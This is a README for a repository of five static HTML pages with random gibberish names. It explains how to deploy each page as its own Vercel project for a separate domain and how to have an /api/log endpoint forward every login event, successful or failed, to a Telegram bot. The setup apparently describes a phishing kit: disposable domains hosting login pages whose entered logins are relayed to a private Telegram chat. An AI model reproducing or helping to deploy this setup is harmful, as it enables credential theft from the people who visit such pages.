## Deploy each page to its own `*.vercel.app`

Vercel gives **one** `*.vercel.app` domain per Vercel **project**. To get a separate domain per HTML page, this repo contains one deployable “app” per page under `apps/`.

### Apps

- `apps/asfgsadgvfsdag/`
- `apps/dfgnjkdfsghjfsg/`
- `apps/dskahjfasdkfjhdk/`
- `apps/jfdsfadhfadfa/`
- `apps/sdauyfashbf/`

Each app is a static site with an `index.html` at the app root.

### How to deploy on Vercel

In the Vercel dashboard:

1. Import this GitHub repo.
2. Create **one Vercel project per app**.
3. For each project, set **Root Directory** to the app folder (example: `apps/dskahjfasdkfjhdk`).
4. No build command is required; it deploys as a static site.

You will end up with 5 separate `*.vercel.app` domains (one per project).

## Telegram login notifications

The server endpoint `POST /api/log` sends a Telegram message for every event with `action="login"` (success or failure).

Set these env vars (see `.env.example`):

- `TELEGRAM_BOT_TOKEN`
- `TELEGRAM_CHAT_ID`

### Vercel per-page deploys

If you deploy each page as its own Vercel project with **Root Directory** set to an `apps/<name>` folder, that app must contain its own serverless function at `apps/<name>/api/log.js` (so the page can call `/api/log` on the same domain).

Troubleshooting (no Telegram messages):

- Open DevTools → Network and click the login button, then open the `/api/log` response JSON; it includes `{ sent, reason }`.
- Most common cause: `TELEGRAM_BOT_TOKEN` / `TELEGRAM_CHAT_ID` not set in that specific Vercel project (production environment).
